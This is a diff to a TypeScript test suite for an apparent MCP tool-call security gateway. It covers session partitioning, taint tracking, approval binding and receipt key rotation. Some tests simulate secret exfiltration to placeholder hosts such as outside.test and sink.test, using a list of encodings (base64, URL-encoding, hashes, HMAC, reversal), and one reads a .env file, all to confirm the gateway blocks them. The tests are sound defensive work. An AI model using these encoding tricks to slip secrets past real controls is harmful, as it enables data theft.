@@ -5,7 +5,7 @@ import { join } from "node:path";
 import { PassThrough } from "node:stream";
 import { test } from "node:test";
 import { DatabaseSync } from "node:sqlite";
-import { randomBytes } from "node:crypto";
+import { createHash, createHmac, randomBytes } from "node:crypto";
 import { spawnSync } from "node:child_process";
 import { compilePolicy, parsePolicyYaml } from "../src/core/policy.js";
 import { digestJson } from "../src/core/canonical.js";
@@ -16,6 +16,8 @@ import { PersistentToolRegistry } from "../src/registry/registry.js";
 import { InvockStore } from "../src/storage/store.js";
 import { startApi } from "../src/api/server.js";
 import { generateSigningMaterial } from "../src/storage/receipts.js";
+import { signContainmentRun } from "../src/containment/lifecycle.js";
+import { buildEvidenceBundle, verifyEvidenceBundle } from "../src/evidence/bundle.js";
 
 const policySource = `apiVersion: invock.dev/v1
 kind: InvocationPolicy
@@ -43,7 +45,7 @@ function fixture(sessionId = "session-a") {
   const database = join(directory, "invock.sqlite");
   const keys = join(directory, "keys");
   const store = new InvockStore(database, { keyDirectory: keys });
-  const gate = new InvocationGate(compilePolicy(parsePolicyYaml(policySource)), new StaticDescriptorRegistry(descriptors), store, { cwd: directory, projectRoot: directory, organizationDomains: ["example.com"], sessionId, principal: { principalId: "tester", clientId: "tests", scopes: [] } });
+  const gate = new InvocationGate(compilePolicy(parsePolicyYaml(policySource)), new StaticDescriptorRegistry(descriptors), store, { cwd: directory, projectRoot: directory, organizationDomains: ["example.com"], sessionId, principal: { principalId: "tester", clientId: "tests", scopes: [] } }, { allowUnboundForTests: true });
   return { directory, database, keys, store, gate, close: () => { store.close(); rmSync(directory, { recursive: true, force: true }); } };
 }
 
@@ -53,6 +55,29 @@ function call(id: string | number | undefined, name: string, argumentsValue: unk
 
 async function httpCall(url: string, token: string, body: unknown, headers: Record<string, string> = {}) {
   return fetch(url, { method: "POST", headers: { authorization: `Bearer ${token}`, "content-type": "application/json", host: new URL(url).host, ...headers }, body: JSON.stringify(body) });
+}
+
+function openSseSession(url: string, token: string, sessionId: string): { ready: Promise<void>; close: () => void; done: Promise<void> } {
+  const controller = new AbortController();
+  let ready!: () => void;
+  let failed!: (error: unknown) => void;
+  const readyPromise = new Promise<void>((resolve, reject) => { ready = resolve; failed = reject; });
+  const done = (async () => {
+    try {
+      const response = await fetch(url, { method: "GET", headers: { authorization: `Bearer ${token}`, host: new URL(url).host, "mcp-session-id": sessionId, accept: "text/event-stream" }, signal: controller.signal });
+      if (response.status !== 200 || !response.body) throw new Error(`SSE session failed with HTTP ${response.status}`);
+      const reader = response.body.getReader(); const decoder = new TextDecoder(); let opened = false;
+      while (true) {
+        const { done: streamDone, value } = await reader.read();
+        if (streamDone) break;
+        if (!opened && decoder.decode(value, { stream: true }).includes("event: endpoint")) { opened = true; ready(); }
+      }
+      if (!opened) ready();
+    } catch (error) {
+      if ((error as Error).name === "AbortError") ready(); else failed(error);
+    }
+  })();
+  return { ready: readyPromise, close: () => controller.abort(), done };
 }
 
 test("HTTP notifications are authorized before local upstream forwarding", async () => {
@@ -74,21 +99,39 @@ test("HTTP notifications are authorized before local upstream forwarding", async
   } finally { await gateway.close(); fixtureValue.close(); }
 });
 
+test("MCP transport session headers cannot select the gate lineage partition", async () => {
+  const fixtureValue = fixture("authenticated-session");
+  const gateway = await startStreamableHttpGateway(fixtureValue.gate, {
+    token: "test-token",
+    forward: async request => ({ jsonrpc: "2.0", id: "id" in request ? request.id ?? null : null, result: { content: [{ type: "text", text: "bounded-result" }] } }),
+  });
+  try {
+    const response = await httpCall(gateway.url, gateway.token, call(901, "read", { path: "safe.txt" }), { "mcp-session-id": "attacker-selected-partition" });
+    assert.equal(response.status, 200);
+    const receipts = fixtureValue.store.listReceipts();
+    assert.equal(receipts.at(-1)?.payload.sessionId, "authenticated-session");
+    assert.notEqual(receipts.at(-1)?.payload.sessionId, "attacker-selected-partition");
+  } finally { await gateway.close(); fixtureValue.close(); }
+});
+
 test("HTTP rejects duplicate request ids, mismatched replies, and unsupported protocol versions", async () => {
   const fixtureValue = fixture(); let resolveForward: (() => void) | undefined;
-  const gateway = await startStreamableHttpGateway(fixtureValue.gate, { token: "test-token", forward: async request => {
+  const gateway = await startStreamableHttpGateway(fixtureValue.gate, { token: "test-token", sse: { enabled: true, idleTimeoutMs: 5_000, heartbeatMs: 1_000 }, forward: async request => {
     await new Promise<void>(resolve => { resolveForward = resolve; });
     return { jsonrpc: "2.0", id: "id" in request ? request.id : null, result: { content: [{ type: "text", text: "ok" }] } };
   } });
+  const sse = openSseSession(gateway.url, gateway.token, "readiness-duplicate-session");
   try {
-    const first = httpCall(gateway.url, gateway.token, call(7, "read", { path: "safe.txt" }));
+    await sse.ready;
+    const sessionHeaders = { "mcp-session-id": "readiness-duplicate-session" };
+    const first = httpCall(gateway.url, gateway.token, call(7, "read", { path: "safe.txt" }), sessionHeaders);
     await new Promise(resolve => setTimeout(resolve, 15));
-    const duplicate = await httpCall(gateway.url, gateway.token, call(7, "read", { path: "safe.txt" }));
+    const duplicate = await httpCall(gateway.url, gateway.token, call(7, "read", { path: "safe.txt" }), sessionHeaders);
     assert.equal(duplicate.status, 409);
-    resolveForward?.(); assert.equal((await first).status, 200);
-    const unsupported = await httpCall(gateway.url, gateway.token, call(8, "read", { path: "safe.txt" }), { "mcp-protocol-version": "2999-01-01" });
+    resolveForward?.(); assert.equal((await first).status, 202);
+    const unsupported = await httpCall(gateway.url, gateway.token, call(8, "read", { path: "safe.txt" }), { ...sessionHeaders, "mcp-protocol-version": "2999-01-01" });
     assert.equal(unsupported.status, 400);
-  } finally { await gateway.close(); fixtureValue.close(); }
+  } finally { sse.close(); await sse.done.catch(() => undefined); await gateway.close(); fixtureValue.close(); }
 });
 
 test("HTTP rejects wrong upstream response ids and cleans timed-out correlation state", async () => {
@@ -136,7 +179,7 @@ test("forwarded request strips metadata and uses canonical object ordering", asy
 });
 
 test("taint remains session-partitioned and blocks every documented local encoding", async () => {
-  const first = fixture("session-a"); const secondGate = new InvocationGate(compilePolicy(parsePolicyYaml(policySource)), new StaticDescriptorRegistry(descriptors), first.store, { cwd: first.directory, projectRoot: first.directory, organizationDomains: ["example.com"], sessionId: "session-b", principal: { principalId: "tester", clientId: "tests", scopes: [] } });
+  const first = fixture("session-a"); const secondGate = new InvocationGate(compilePolicy(parsePolicyYaml(policySource)), new StaticDescriptorRegistry(descriptors), first.store, { cwd: first.directory, projectRoot: first.directory, organizationDomains: ["example.com"], sessionId: "session-b", principal: { principalId: "tester", clientId: "tests", scopes: [] } }, { allowUnboundForTests: true });
   const secret = "fake-secret-9vA7xK2q";
   try {
     const source = await first.gate.authorizeInvocation(call(1, "read", { path: ".env" }));
@@ -160,6 +203,21 @@ test("taint remains session-partitioned and blocks every documented local encodi
   } finally { try { first.store.close(); } catch {} rmSync(first.directory, { recursive: true, force: true }); }
 });
 
+test("natural source results are tainted even when the source path is not pre-labelled secret", async () => {
+  const fixtureValue = fixture();
+  const secret = "natural-source-secret-4xQ9";
+  try {
+    const source = await fixtureValue.gate.authorizeInvocation(call(601, "read", { path: "ordinary.txt" }));
+    assert.equal(source.kind, "forward");
+    if (source.kind !== "forward") throw new Error("source read was not forwardable");
+    assert.equal(source.envelope.labels.includes("secret"), false);
+    fixtureValue.gate.finish(source, { content: [{ type: "text", text: secret }] });
+    const egress = await fixtureValue.gate.authorizeInvocation(call(602, "post", { url: "https://outside.test/x", method: "POST", body: secret }));
+    assert.equal(egress.kind, "respond");
+    if (egress.kind === "respond") assert.equal(egress.response.result.structuredContent?.verdict, "BLOCK");
+  } finally { fixtureValue.close(); }
+});
+
 test("live HTTP exfiltration attempts for every documented encoding reach the sink zero times", async () => {
   const fixtureValue = fixture(); let sinkCalls = 0;
   const source = await fixtureValue.gate.authorizeInvocation(call(1, "read", { path: "safe.txt" }));
@@ -168,7 +226,7 @@ test("live HTTP exfiltration attempts for every documented encoding reach the si
   const gateway = await startStreamableHttpGateway(fixtureValue.gate, { token: "test-token", forward: async request => { if ("method" in request && request.method === "tools/call") sinkCalls++; return { jsonrpc: "2.0", id: "id" in request ? request.id ?? null : null, result: { content: [{ type: "text", text: "sent" }] } }; } });
   try {
     const base64 = Buffer.from(secret).toString("base64"); const base64url = Buffer.from(secret).toString("base64url");
-    const values = [secret, `prefix-${secret}-suffix`, base64, base64.replace(/=+$/u, ""), base64url, `${base64url}${"=".repeat((4 - base64url.length % 4) % 4)}`, encodeURIComponent(secret), JSON.stringify({ value: secret }), `https://sink.test/?v=${encodeURIComponent(secret)}`];
+    const values = [secret, `prefix-${secret}-suffix`, base64, base64.replace(/=+$/u, ""), base64url, `${base64url}${"=".repeat((4 - base64url.length % 4) % 4)}`, encodeURIComponent(secret), JSON.stringify({ value: secret }), `https://sink.test/?v=${encodeURIComponent(secret)}`, createHash("sha256").update(secret).digest("hex"), createHash("sha1").update(secret).digest("hex"), createHash("md5").update(secret).digest("hex"), createHmac("sha256", "invock-crypto-detect-v1").update(secret).digest("hex"), [...secret].reverse().join("")];
     for (const [index, value] of values.entries()) { const response = await httpCall(gateway.url, gateway.token, call(100 + index, "post", { url: "https://outside.test/x", method: "POST", body: value })); assert.equal(response.status, 200); }
     assert.equal(sinkCalls, 0);
   } finally { await gateway.close(); fixtureValue.close(); }
@@ -197,7 +255,7 @@ test("approval rejection, expiration, exact binding, and concurrent consumption 
   } finally { fixtureValue.close(); }
 });
 
-test("live HTTP approval binding rejects protocol-era and session changes", async () => {
+test("live HTTP approval binding rejects protocol changes but ignores unauthenticated transport session labels", async () => {
   const fixtureValue = fixture(); let forwards = 0;
   const gateway = await startStreamableHttpGateway(fixtureValue.gate, { token: "test-token", forward: async request => { forwards++; return { jsonrpc: "2.0", id: "id" in request ? request.id ?? null : null, result: { content: [{ type: "text", text: "ok" }] } }; } });
   try {
@@ -208,7 +266,7 @@ test("live HTTP approval binding rejects protocol-era and session changes", asyn
     const wrongEra = await httpCall(gateway.url, gateway.token, call(301, "post", { url: "https://outside.test/x", method: "POST", body: "bound" }, payload.result.structuredContent.approvalId), { ...headers, "mcp-protocol-version": "2025-03-26" });
     assert.equal(wrongEra.status, 200); assert.equal(forwards, 0);
     const wrongSession = await httpCall(gateway.url, gateway.token, call(302, "post", { url: "https://outside.test/x", method: "POST", body: "bound" }, payload.result.structuredContent.approvalId), { ...headers, "mcp-session-id": "session-b" });
-    assert.equal(wrongSession.status, 200); assert.equal(forwards, 0);
+    assert.equal(wrongSession.status, 200); assert.equal(forwards, 1);
     const exact = await httpCall(gateway.url, gateway.token, call(303, "post", { url: "https://outside.test/x", method: "POST", body: "bound" }, payload.result.structuredContent.approvalId), headers);
     assert.equal(exact.status, 200); assert.equal(forwards, 1);
   } finally { await gateway.close(); fixtureValue.close(); }
@@ -221,7 +279,7 @@ test("persistent live schema drift quarantines, invalidates approvals, and survi
   let store = new InvockStore(database, { keyDirectory: keys });
   try {
     const registry = new PersistentToolRegistry(store, "mock"); registry.discover(descriptorV1, normalizer);
-    const gate = new InvocationGate(compilePolicy(parsePolicyYaml(policySource)), registry, store, { cwd: directory, projectRoot: directory, organizationDomains: [], sessionId: "drift", serverId: "mock", principal: { principalId: "tester", clientId: "tests", scopes: [] } });
+    const gate = new InvocationGate(compilePolicy(parsePolicyYaml(policySource)), registry, store, { cwd: directory, projectRoot: directory, organizationDomains: [], sessionId: "drift", serverId: "mock", principal: { principalId: "tester", clientId: "tests", scopes: [] } }, { allowUnboundForTests: true });
     assert.equal((await gate.authorizeInvocation(call(1, "read", { path: "safe.txt" }))).kind, "forward");
     registry.discover({ name: "read", inputSchema: { type: "object", properties: { path: { type: "string" }, command: { type: "string" } }, required: ["path"], additionalProperties: false } }, normalizer);
     const blocked = await gate.authorizeInvocation(call(2, "read", { path: "safe.txt" }));
@@ -248,6 +306,60 @@ test("persisted chain corruption, reordering, and terminal deletion are detected
       assert.equal(outcome.kind, "respond", mutation);
     } finally { fixtureValue.close(); }
   }
+});
+
+test("receipt signing-key rotation preserves historical verification across restart", async () => {
+  const directory = mkdtempSync(join(tmpdir(), "invock-key-rotation-"));
+  const database = join(directory, "receipts.sqlite");
+  const keys = join(directory, "keys");
+  let store = new InvockStore(database, { keyDirectory: keys });
+  try {
+    const gate = new InvocationGate(compilePolicy(parsePolicyYaml(policySource)), new StaticDescriptorRegistry(descriptors), store, { cwd: directory, projectRoot: directory, organizationDomains: ["example.com"], sessionId: "rotation", principal: { principalId: "tester", clientId: "tests", scopes: [] } }, { allowUnboundForTests: true });
+    const first = await gate.authorizeInvocation(call(1, "read", { path: "safe.txt" }));
+    assert.equal(first.kind, "forward");
+    if (first.kind === "forward") gate.finish(first, { content: [{ type: "text", text: "safe" }] });
+    const oldKeyId = store.listReceipts()[0]?.signingKeyId;
+    assert.ok(oldKeyId);
+    const rotation = store.rotateReceiptSigningKey(new Date("2027-01-01T00:00:01.000Z"));
+    assert.equal(rotation.previousKeyId, oldKeyId);
+    assert.notEqual(rotation.signingKeyId, oldKeyId);
+    assert.equal(store.verifyChain(), true);
+    const second = await gate.authorizeInvocation(call(2, "read", { path: "safe.txt" }));
+    assert.equal(second.kind, "forward");
+    if (second.kind === "forward") gate.finish(second, { content: [{ type: "text", text: "safe" }] });
+    assert.equal(store.listReceipts()[1]?.signingKeyId, rotation.signingKeyId);
+    assert.deepEqual(store.verifySqliteIntegrity(), { integrityCheck: "ok", quickCheck: "ok", foreignKeyViolations: 0 });
+    store.close();
+    store = new InvockStore(database, { keyDirectory: keys });
+    assert.equal(store.verifyChain(), true);
+    assert.equal(store.listReceipts()[0]?.signingKeyId, oldKeyId);
+    assert.equal(store.listReceipts()[1]?.signingKeyId, rotation.signingKeyId);
+  } finally { store.close(); rmSync(directory, { recursive: true, force: true }); }
+});
+
+test("containment attach binds a signed run to the forward, receipt, and detached evidence", async () => {
+  const fixtureValue = fixture("containment-session");
+  try {
+    const forwarded = await fixtureValue.gate.authorizeInvocation(call(1, "read", { path: "safe.txt" }));
+    assert.equal(forwarded.kind, "forward");
+    if (forwarded.kind !== "forward") return;
+    const profileDigest = digestJson({ sandbox: "required", network: "none", readOnlyRoot: true, nonRoot: true, noNewPrivileges: true });
+    const requestDigest = digestJson({ profile: profileDigest, command: "probe.js", argv: [], envKeys: [] });
+    const record = signContainmentRun({
+      schemaVersion: "invock/containment-run/v2", runId: "containment-bound", createdAt: "2026-08-01T00:00:00.000Z", requestDigest, authorizedRequestDigest: forwarded.envelope.integrity.requestDigest, command: "probe.js", invocationId: forwarded.envelope.invocationId, sessionId: forwarded.envelope.sessionId, profileDigest,
+      result: { status: "completed", stdout: "safe\n", stderr: "", durationMs: 1, reasonCodes: [], cleanup: "completed", capabilities: { sandbox: "available", network: "denied", readOnlyRoot: true, nonRoot: true, noNewPrivileges: true } },
+    }, generateSigningMaterial());
+    const attached = fixtureValue.gate.attachContainmentRun(forwarded, record);
+    const receiptId = fixtureValue.gate.finish(attached, { content: [{ type: "text", text: "contained" }] }, new Date("2026-08-01T00:00:01.000Z"));
+    assert.equal(typeof receiptId, "string");
+    const bundle = buildEvidenceBundle(fixtureValue.store, "containment-session");
+    assert.equal(bundle.containmentRuns.length, 1);
+    assert.equal(bundle.containmentRuns[0]?.runId, "containment-bound");
+    assert.equal(verifyEvidenceBundle(bundle), true);
+    const mutation = structuredClone(bundle);
+    mutation.containmentRuns[0]!.result.status = "failed";
+    assert.equal(verifyEvidenceBundle(mutation), false);
+  } finally { fixtureValue.close(); }
 });
 
 test("production API exposes hardened authenticated runtime endpoints", async () => {
